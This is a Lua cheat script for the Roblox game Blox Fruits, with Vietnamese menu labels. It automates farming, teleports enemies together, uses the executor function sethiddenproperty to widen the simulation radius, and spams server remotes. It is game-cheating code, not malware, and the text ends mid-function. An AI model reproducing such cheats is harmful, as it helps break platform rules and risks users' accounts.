local SelectFastAttackMode = (SelectFastAttackMode or "Super Attack")

SelectedFastAttackMode = {"Low Attack","Fast Attack","Super Attack"}

local function ChangeModeFastAttack(SelectFastAttackMode)
	if SelectFastAttackMode == "Normal Attack" then
		FireCooldown = 0.5
	elseif SelectFastAttackMode == "Fast Attack" then
		FireCooldown = 0.2
	elseif SelectFastAttackMode == "Super Attack" then
		FireCooldown = 0.1
	end
end

local SelectedFastAttackModes = Tabs.Main:AddDropdown("SelectedFastAttackModes", {
	Title = "Chọn Tốc Độ Đánh",
	Values = SelectedFastAttackMode,
	Multi = false,
	Default = 3,
})

SelectedFastAttackModes:OnChanged(function(value)
	SelectFastAttackMode = value
	ChangeModeFastAttack(SelectFastAttackMode)	
end)
local Dropdown = Tabs.Main:AddDropdown("DropdownFarm", {
    Title = "Chọn Farm",
    Values = {"Farm Level", "Farm Bone", "Farm Katakuri"},
    Multi = false,
})

Dropdown:SetValue("Farm Level")
Dropdown:OnChanged(function(Value)
FarmMode = Value
end)

local Bone = {
    ["Reborn Skeleton"] = CFrame.new(-8769.58984, 142.13063, 6055.27637),
    ["Living Zombie"] = CFrame.new(-10156.4531, 138.652481, 5964.5752),
    ["Demonic Soul"] = CFrame.new(-9525.17188, 172.13063, 6152.30566),
    ["Posessed Mummy"] = CFrame.new(-9570.88281, 5.81831884, 6187.86279)
}

spawn(function()
    spawn(function()
        while task.wait(.1) do
            if BonesBring then
                pcall(function()
                    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                        if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy" then
                            local targetCFrame = Bone[v.Name]
                            if targetCFrame then
                                v.HumanoidRootPart.CFrame = targetCFrame
                            end
                            v.Head.CanCollide = false
                            v.Humanoid.Sit = false
                            v.Humanoid:ChangeState(14)
                            v.HumanoidRootPart.CanCollide = false
                            v.Humanoid.JumpPower = 0
                            v.Humanoid.WalkSpeed = 0
                            if v.Humanoid:FindFirstChild('Animator') then
                                v.Humanoid:FindFirstChild('Animator'):Destroy()
                            end
                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                        end
                    end
                end)
            end
        end
    end)
end)

local Cake = {
    ["Cookie Crafter"] = CFrame.new(-2333.28052, 37.8239059, -12093.2861),
    ["Cake Guard"] = CFrame.new(-1575.56433, 37.8238907, -12416.2529),
    ["Baking Staff"] = CFrame.new(-1872.35742, 37.8239517, -12899.4248),
    ["Head Baker"] = CFrame.new(-2223.1416, 53.5283203, -12854.752)
}

spawn(function()
    spawn(function()
        while task.wait(.1) do
            if CakeBring then
                pcall(function()
                    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                        if v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name == "Head Baker" then
                            local targetCFrame = Cake[v.Name]
                            if targetCFrame then
                                v.HumanoidRootPart.CFrame = targetCFrame
                            end
                            v.Head.CanCollide = false
                            v.Humanoid.Sit = false
                            v.Humanoid:ChangeState(14)
                            v.HumanoidRootPart.CanCollide = false
                            v.Humanoid.JumpPower = 0
                            v.Humanoid.WalkSpeed = 0
                            if v.Humanoid:FindFirstChild('Animator') then
                                v.Humanoid:FindFirstChild('Animator'):Destroy()
                            end
                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                        end
                    end
                end)
            end
        end
    end)
end)

spawn(function()
        while wait() do
            if FarmMode == "Farm Level" and _G.AutoFarm then
                pcall(function()
local QuestTitle = game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text
                    if not string.find(QuestTitle, NameMon) then
                        StartMagnet = false
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                    end
                    if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == false then
                        
                        StartMagnet = false
                        CheckQuest()
                        if BypassTP then
                        if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameQuest.Position).Magnitude > 1500 then
						BTP(CFrameQuest * CFrame.new(0,20,5))
						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameQuest.Position).Magnitude < 1500 then
						topos(CFrameQuest)
						end
					else
						topos(CFrameQuest)
					end
					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameQuest.Position).Magnitude <= 5 then
						game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest",NameQuest,LevelQuest)
                        end
                    elseif game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == true then
                        CheckQuest()
                        if game:GetService("Workspace").Enemies:FindFirstChild(Mon) then
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                                    if v.Name == Mon then
                                        if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) then
                                                repeat wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                AutoHaki()                                                 
                                                PosMon = v.HumanoidRootPart.CFrame
                                                topos(v.HumanoidRootPart.CFrame * Pos)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Humanoid.WalkSpeed = 0
                                                v.Head.CanCollide = false
                                                StartMagnet = true
                                                
                                            until not _G.AutoFarm or v.Humanoid.Health <= 0 or not v.Parent or game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == false
                                        else
                                            StartMagnet = false
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                                        end
                                    end
                                end
                            end
                        else
                            topos(CFrameMon)
                            StartMagnet = false
                            if game:GetService("ReplicatedStorage"):FindFirstChild(Mon) then
                             topos(game:GetService("ReplicatedStorage"):FindFirstChild(Mon).HumanoidRootPart.CFrame * CFrame.new(15,10,2))
                            end
                        end
                    end
                end)
            end
        end
    end) 
    
    spawn(
            function()
            while wait() do
                if FarmMode == "Farm Bone" and _G.AutoFarm and World3 then
                    pcall(  
                            function()                        
                    if game:GetService("Workspace").Enemies:FindFirstChild("Reborn Skeleton") or game:GetService("Workspace").Enemies:FindFirstChild("Living Zombie") or game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Posessed Mummy") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy" then
                               if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                   repeat wait()
                                        AutoHaki()
                                   if not game.Players.LocalPlayer.Character:FindFirstChild(_G.SelectWeapon) then
                                        wait()
                                        end
                                        EquipWeapon(_G.SelectWeapon)     
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false 
                                        BonesBring = true         
                                        topos(v.HumanoidRootPart.CFrame * Pos)
                                    until not _G.AutoFarm or not v.Parent or v.Humanoid.Health <= 0
                                end
                            end
                        end
                    else
                    if BypassTP then
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - UwU.Position).Magnitude > 1500 then
			        BTP(UwU)
				    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - UwU.Position).Magnitude < 1500 then
				    topos(UwU)
					end
				else
				    topos(UwU)
				end
				        UnEquipWeapon(_G.SelectWeapon)
                        BonesBring = false					   
				     	topos(CFrame.new(-9506.234375, 172.130615234375, 6117.0771484375))
                        for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                            if v.Name == "Reborn Skeleton" then
                                topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                            elseif v.Name == "Living Zombie" then
                                topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                            elseif v.Name == "Demonic Soul" then
                                topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                            elseif v.Name == "Posessed Mummy" then
                                topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                            end
                        end
                    end
                end                
                )
            end
        end
    end
    )

spawn(function()
       while wait() do
         if FarmMode == "Farm Katakuri" and _G.AutoFarm and World3 then
         pcall(function()                        
      if game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == "Cake Prince" then
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    repeat task.wait()
                                        AutoHaki()
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0 
                                        NeedAttacking = true
                                 v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                        topos(v.HumanoidRootPart.CFrame *Pos)
                                        CakeBring = false
                                        sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",math.huge)
                                    until not _G.AutoFarm == false or not v.Parent or v.Humanoid.Health <= 0 or tween:Cancel() or game:GetService("Workspace").Enemies:FindFirstChild("Ring") and game:GetService("Workspace").Enemies:FindFirstChild("Fist")
                                if game:GetService("Workspace").Enemies:FindFirstChild("Ring") and game:GetService("Workspace").Enemies:FindFirstChild("Fist")  then 
                     topos(v.HumanoidRootPart.CFrame * CFrame.new(0, 200, 0))
                             end
                             end
                            end
                        end
                    else
               if game:GetService("Workspace").Map.CakeLoaf.BigMirror.Other.Transparency == 0 and (CFrame.new(-1990.672607421875, 4532.99951171875, -14973.6748046875).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 500 then
                        topos(CFrame.new(-2151.82153, 149.315704, -12404.9053))
                         else
                            if KillMob == 0 then
                            end                    
                            if game:GetService("Workspace").Map.CakeLoaf.BigMirror.Other.Transparency == 1 then
                                if game:GetService("Workspace").Enemies:FindFirstChild("Cookie Crafter") or game:GetService("Workspace").Enemies:FindFirstChild("Cake Guard") or game:GetService("Workspace").Enemies:FindFirstChild("Baking Staff") or game:GetService("Workspace").Enemies:FindFirstChild("Head Baker") then
                                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                        if v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name == "Head Baker" then
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat wait()
                                                    AutoHaki()
                                                    EquipWeapon(_G.SelectWeapon)
                                           v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Head.CanCollide = false 
                                                    NeedAttacking = true
                                                    CakeBring = true 
                                                    topos(v.HumanoidRootPart.CFrame * Pos)
                                                    sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",math.huge)            
                                                until not _G.AutoFarm or not v.Parent or v.Humanoid.Health <= 0 or game:GetService("Workspace").Map.CakeLoaf.BigMirror.Other.Transparency == 0 or game:GetService("ReplicatedStorage"):FindFirstChild("Cake Prince [Lv. 2300] [Raid Boss]") or game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince [Lv. 2300] [Raid Boss]") or KillMob == 0
                                            end
                                        end
                                    end
                                else
                                if BypassTP then
                                if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CakePos.Position).Magnitude > 1500 then
						        BTP(CakePos)
						        elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CakePos.Position).Magnitude < 1500 then
						        end
						     end
                             CakeBring = false                     
                             local RandomTele = math.random(1, 3)
                                if RandomTele == 1 then
                                    topos(CFrame.new(-1436.86011, 167.753616, -12296.9512))
                                elseif RandomTele == 2 then
                                    topos(CFrame.new(-2383.78979, 150.450592, -12126.4961))
                                elseif RandomTele == 3 then
                                    topos(CFrame.new(-2231.2793, 168.256653, -12845.7559))
                                end
                                    if game:GetService("ReplicatedStorage"):FindFirstChild("Cookie Crafter") then
                                        topos(game:GetService("ReplicatedStorage"):FindFirstChild("Cookie Crafter").HumanoidRootPart.CFrame * CFrame.new(2,20,2)) 
                                    else
                                        if game:GetService("ReplicatedStorage"):FindFirstChild("Cake Guard") then
                                            topos(game:GetService("ReplicatedStorage"):FindFirstChild("Cake Guard").HumanoidRootPart.CFrame * CFrame.new(2,20,2)) 
                                        else
                                            if game:GetService("ReplicatedStorage"):FindFirstChild("Baking Staff") then
                                                topos(game:GetService("ReplicatedStorage"):FindFirstChild("Baking Staff").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                                            else
                                                if game:GetService("ReplicatedStorage"):FindFirstChild("Head Baker") then
                                                    topos(game:GetService("ReplicatedStorage"):FindFirstChild("Head Baker").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                                                end
                                            end
                                        end
                                    end                       
                                end
                            else
                                if game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince") then
                                    topos(game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                                else
                                    if game:GetService("ReplicatedStorage"):FindFirstChild("Cake Prince") then
                                        topos(game:GetService("ReplicatedStorage"):FindFirstChild("Cake Prince").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    end)       

------//Select Weapon
local Dropdown = Tabs.Main:AddDropdown("DropdownFarm", {
    Title = "Chọn Vũ Khí",
    Values = {"Melee", "Sword", "Gun", "Fruit"},
    Multi = false,
})

Dropdown:SetValue("Melee")
Dropdown:OnChanged(function(Value)
_G.SelectWeapon = Value
end)    

task.spawn(function()
	while wait() do
		pcall(function()
			if _G.SelectWeapon == "Melee" then
				for i ,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.ToolTip == "Melee" then
						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
							_G.SelectWeapon = v.Name
						end
					end
				end
			elseif _G.SelectWeapon == "Sword" then
				for i ,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.ToolTip == "Sword" then
						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
							_G.SelectWeapon = v.Name
						end
					end
				end
			elseif _G.SelectWeapon == "Gun" then
				for i ,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.ToolTip == "Gun" then
						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
							_G.SelectWeapon = v.Name
						end
					end
				end
			elseif _G.SelectWeapon == "Fruit" then
				for i ,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.ToolTip == "Blox Fruit" then
						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
							_G.SelectWeapon = v.Name
						end
					end
				end
			end
		end)
	end
    end)          

          
local Toggle = Tabs.Main:AddToggle("Start Auto Farm", { Title = "Start Auto Farm", Description = "Bắt Đầu Farm", Default = false })
Toggle:OnChanged(function(Value)
    _G.AutoFarm = Value
    StopTween(_G.AutoFarm)
end)
local Meo = Tabs.Main:AddSection("Đánh Hải Tặc Và Nhà Máy")
local Toggle = Tabs.Main:AddToggle("Auto Eliter Hunter", { Title = "Auto Đánh Hải Tặc | Sea 3", Default = false })
Toggle:OnChanged(function(Value)
    _G.RaidPirate = Value
 StopTween(_G.RaidPirate)
end)    	
	
spawn(function()
    while wait() do
        if _G.RaidPirate then
            pcall(function()
                local CFrameBoss = CFrame.new(-5496.17432, 313.768921, -2841.53027)
                if (CFrame.new(-5539.3115234375, 313.800537109375, -2972.372314453125).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 500 then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if _G.RaidPirate and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                            if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 2000 then
                                repeat task.wait()
                                    AutoHaki()
                                    EquipWeapon(_G.SelectWeapon)
                                    v.HumanoidRootPart.CanCollide = false
                                    topos(v.HumanoidRootPart.CFrame * Pos)
                                until v.Humanoid.Health <= 0 or not v.Parent or not _G.RaidPirate
                            end
                        end
                    end
                else
                    UnEquipWeapon(_G.SelectWeapon)
                    if BypassTP then
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameBoss.Position).Magnitude > 1500 then
			        BTP(CFrameBoss)
				    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameBoss.Position).Magnitude < 1500 then
				    topos(CFrameBoss)
					 end
                 end
          topos(CFrame.new(-5496.17432, 313.768921, -2841.53027))
                end
             end
            )
        end
    end
end
)
--/Farm Sea 2
local Toggle = Tabs.Main:AddToggle("Auto Rengoku", { Title = "Auto Đánh Nhà Máy | Sea 2", Default = false })
Toggle:OnChanged(function(Value)
    _G.Auto_Nha_Dien = Value
    StopTween(_G.Auto_Nha_Dien)
end)            

spawn(function()
    while wait() do
        pcall(function()
            if _G.Auto_Nha_Dien and World2 then
                if game:GetService("Workspace").Enemies:FindFirstChild("Core") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Core" and v.Humanoid.Health > 0 then
                            repeat task.wait()
                                AutoHaki()         
                                EquipWeapon(_G.SelectWeapon)           
                                topos(CFrame.new(448.46756, 199.356781, -441.389252))
                            until v.Humanoid.Health <= 0 or _G.Auto_Nha_Dien == false
                        end
                    end
                else             
                    topos(CFrame.new(448.46756, 199.356781, -441.389252))
                end
            end
        end)
    end
end)

local Ren = {
    ["Snow Lurker"] = CFrame.new(5480.55762, 28.8536663, -6814.50293),
    ["Arctic Warrior"] = CFrame.new(6118.56836, 28.3932438, -6259.84961)
}

spawn(function()
    spawn(function()
        while wait(.1) do
            if RenGuKu and _G.BringMonster and World2 then
                pcall(function()
                    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                        if v.Name == "Snow Lurker" or v.Name == "Arctic Warrior" then
                            local targetCFrame = Ren[v.Name]
                            if targetCFrame then
                                v.HumanoidRootPart.CFrame = targetCFrame
                            end
                            v.Head.CanCollide = false
                            v.Humanoid.Sit = false
                            v.HumanoidRootPart.CanCollide = false
                            v.Humanoid.JumpPower = 0
                            v.Humanoid.WalkSpeed = 0
                            if v.Humanoid:FindFirstChild('Animator') then
                                v.Humanoid:FindFirstChild('Animator'):Destroy()
                            end
                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                        end
                    end
                end)
            end
        end
    end)
end)
local ConCac = Tabs.Main:AddSection("Main Auto Random")
local Toggle = Tabs.Main:AddToggle("Random Trái Blox", { Title = "Random Fruit", Default = false })
Toggle:OnChanged(function(Value)
    _G.Random_Auto = Value
end)

spawn(function()
        pcall(function()
            while wait(.1) do
                if _G.Random_Auto then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Cousin","Buy")
                end 
            end
        end)
    end)
local Toggle = Tabs.Main:AddToggle("Random Bone", { Title = "Random Xương", Default = false })
Toggle:OnChanged(function(WinDyLaConCacTao)
    _G.RandomBone = WinDyLaConCacTao
end)

spawn(function()
   while wait() do
     if _G.RandomBone then
        local args = {
            [1] = "Bones",
            [2] = "Buy",
            [3] = 1,
            [4] = 1
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
       end
    end
end)

if World3 then

----Tween Nay No Se Check Distance Va Chon Diem De Tele Nhanh Nhat Nhe , Minh Thi Ko Ranh Nen Se Skid Cua May Hub Khac Va Gan Chuc Nang Minh Tu Lam
local Hiz = Tabs.item:AddSection("Farm Nguyên Liệu")
local Dropdown = Tabs.item:AddDropdown("DropdownFarm", {
    Title = "Nguyên Liệu | Sea 3",
    Values = {"Cacao", "Dragon Scale", "Leather"},
    Multi = false,
})

Dropdown:SetValue("Cacao")
Dropdown:OnChanged(function(item)
_G.SelectFarm = item
end)
end

if World2 then
local Dropdown = Tabs.item:AddDropdown("DropdownFarm", {
    Title = "Nguyên Liệu | Sea 2",
    Values = {"Mystic Droplet", "Vampire Fang"},
    Multi = false,
})

Dropdown:SetValue("Mystic Droplet")
Dropdown:OnChanged(function(item)
_G.SelectFarm = item
end)
end

local Cacao = {
    ["Cocoa Warrior"] = CFrame.new(-68.2284622, 24.760067, -12298.3857),
    ["Chocolate Bar Battler"] = CFrame.new(747.73053, 24.7600517, -12651.001),
    ["Sweet Thief"] = CFrame.new(4.85129213, 24.8197231, -12636.0156),
    ["Candy Rebel"] = CFrame.new(80.3499298, 24.8196068, -12947.958)
}

spawn(function()
    spawn(function()
        while wait(.1) do
            if CacaoBring and _G.BringMonster and World3 then
                pcall(function()
                    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                        if v.Name == "Cocoa Warrior" or v.Name == "Chocolate Bar Battler" or v.Name == "Sweet Thief" or v.Name == "Candy Rebel" then
                            local targetCFrame = Cacao[v.Name]
                            if targetCFrame then
                                v.HumanoidRootPart.CFrame = targetCFrame
                            end
                            v.Head.CanCollide = false
                            v.Humanoid.Sit = false
                            v.HumanoidRootPart.CanCollide = false
                            v.Humanoid.JumpPower = 0
                            v.Humanoid.WalkSpeed = 0
                            if v.Humanoid:FindFirstChild('Animator') then
                                v.Humanoid:FindFirstChild('Animator'):Destroy()
                            end
                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                        end
                    end
                end)
            end
        end
    end)
end)

spawn(function()	
task.spawn(function() 
		while wait() do
			if VayRong and _G.BringMonster and World3 then 
				pcall(function() 
					for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
						if v.Name == "Dragon Crew Archer" then 
							v.HumanoidRootPart.CFrame = CFrame.new(6573.67871, 378.427826, 130.257156)
							v.Head.CanCollide = false
							v.Humanoid.Sit = false
							v.HumanoidRootPart.CanCollide = false
							v.Humanoid.JumpPower = 0
							v.Humanoid.WalkSpeed = 0
							if v.Humanoid:FindFirstChild('Animator') then
								v.Humanoid:FindFirstChild('Animator'):Destroy() 
							end
							sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
						end
					end    
				end)
			end
		end
	end)
end)

spawn(function()
task.spawn(function() 
		while wait() do
			if ConCac and _G.BringMonster and World3 then 
				pcall(function() 
					for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
						if v.Name == "Forest Pirate" then 
							v.HumanoidRootPart.CFrame = CFrame.new(-13404.3252, 332.403992, -7837.12061)
							v.Head.CanCollide = false
							v.Humanoid.Sit = false
							v.HumanoidRootPart.CanCollide = false
							v.Humanoid.JumpPower = 0
							v.Humanoid.WalkSpeed = 0
							if v.Humanoid:FindFirstChild('Animator') then
								v.Humanoid:FindFirstChild('Animator'):Destroy() 
							end
							sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
						end
					end    
				end
		           )
			end
		end
	end
	)
end
)
spawn(function()
task.spawn(function() 
		while wait() do
			if Ditme and _G.BringMonster and World3 then 
				pcall(function() 
					for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
						if v.Name == "Vampire" then 
							v.HumanoidRootPart.CFrame = CFrame.new(-6029.84912, 6.42848921, -1324.77417)
							v.Head.CanCollide = false
							v.Humanoid.Sit = false
							v.HumanoidRootPart.CanCollide = false
							v.Humanoid.JumpPower = 0
							v.Humanoid.WalkSpeed = 0
							if v.Humanoid:FindFirstChild('Animator') then
								v.Humanoid:FindFirstChild('Animator'):Destroy() 
							end
							sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
						end
					end    
				end
		         )
			end
		end
	end
	)
end
)
spawn(
        function()
    while wait() do
        if _G.SelectFarm == "Cacao" and StartFarm and World3 then
            pcall(  
                    function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Cocoa Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Chocolate Bar Battler") or game:GetService("Workspace").Enemies:FindFirstChild("Sweet Thief") or game:GetService("Workspace").Enemies:FindFirstChild("Candy Rebel") then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Cocoa Warrior" or v.Name == "Chocolate Bar Battler" or v.Name == "Sweet Thief" or v.Name == "Candy Rebel" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                repeat wait()
                                    AutoHaki()
                                    EquipWeapon(_G.SelectWeapon)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Humanoid.WalkSpeed = 0
                                    CacaoBring = true
                                    topos(v.HumanoidRootPart.CFrame * Pos)   
                                until not StartFarm or not v.Parent or v.Humanoid.Health <= 0
                                CacaoBring = false
                            end
                        end
                    end
                else
                    CacaoBring = false
                    topos(CFrame.new(214.497803, 126.61776, -12602.8291))
                    for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Cocoa Warrior" then
                            topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        elseif v.Name == "Chocolate Bar Battler" then
                            topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        elseif v.Name == "Sweet Thief" then
                            topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        elseif v.Name == "Candy Rebel" then
                            topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        end
                    end
                end
            end
              )
        end
    end
end
)
spawn(function()
    while wait() do
        if _G.SelectFarm == "Dragon Scale" and StartFarm and World3 then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Dragon Crew Archer" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                repeat wait()
                                    AutoHaki()
                                    EquipWeapon(_G.SelectWeapon)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Humanoid.WalkSpeed = 0
                                    VayRong = true
                                    topos(v.HumanoidRootPart.CFrame * Pos)   
                                until not StartFarm or not v.Parent or v.Humanoid.Health <= 0
                                VayRong = false
                            end
                        end
                    end
                else
                    VayRong = false
                    topos(CFrame.new(6690.97705, 512.486572, 315.082397))
                    for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Dragon Crew Archer" then
                            topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        end
                    end
                end
            end
            )
        end
    end
end
)
spawn(function()
    while wait() do
        if _G.SelectFarm == "Leather" and StartFarm and World3 then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Forest Pirate") then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Forest Pirate" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                repeat wait()
                                    AutoHaki()
                                    EquipWeapon(_G.SelectWeapon)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Humanoid.WalkSpeed = 0
                                    ConCac = true
                                    topos(v.HumanoidRootPart.CFrame * Pos)   
                                until not StartFarm or not v.Parent or v.Humanoid.Health <= 0
                                ConCac = false
                            end
                        end
                    end
                else
                    ConCac = false
                    topos(CFrame.new(-13384.4844, 529.895813, -7835.14746))
                    for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Forest Pirate" then
                            topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        end
                    end
                end
            end
            )
        end
    end
end
)
spawn(
        function()	
        task.spawn(
                    function()
      while wait(.1) do
			if Lon and _G.BringMonster and World2 then 
				pcall(function() 
					for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
						if v.Name == "Water Fighter" then 
							v.HumanoidRootPart.CFrame = CFrame.new(-3362.41602, 243.290146, -10467.4346)
							v.Head.CanCollide = false
							v.Humanoid.Sit = false
							v.HumanoidRootPart.CanCollide = false
							v.Humanoid.JumpPower = 0
							v.Humanoid.WalkSpeed = 0
							if v.Humanoid:FindFirstChild('Animator') then
								v.Humanoid:FindFirstChild('Animator'):Destroy() 
							end
							sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
						end
					end    
				end
		        	)
			end
		end
	end)
end
)
spawn(
        function()
                while task.wait() do
      if _G.SelectFarm == "Mystic Droplet" and StartFarm and World2 then               
                    pcall(      
                         function()
                   if game:GetService("Workspace").Enemies:FindFirstChild("Water Fighter") then
           for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Water Fighter" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                repeat wait()
                                    AutoHaki()
                                    EquipWeapon(_G.SelectWeapon)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Humanoid.WalkSpeed = 0
                                    Lon = true
                                    topos(v.HumanoidRootPart.CFrame * Pos)   
                                until not StartFarm or not v.Parent or v.Humanoid.Health <= 0
                                Lon = false
                            end
                        end
                    end
                else
                    Lon = false
                    topos(CFrame.new(-3385.61523, 393.843842, -10475.5225))
                    for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Water Fighter" then
                            topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        end
                    end
                end
            end
            )
        end
    end
end
)
spawn(
        function()
                while task.wait() do
      if _G.SelectFarm == "Vampire Fang" and StartFarm and World2 then               
                    pcall(      
                         function()
                   if game:GetService("Workspace").Enemies:FindFirstChild("Vampire") then
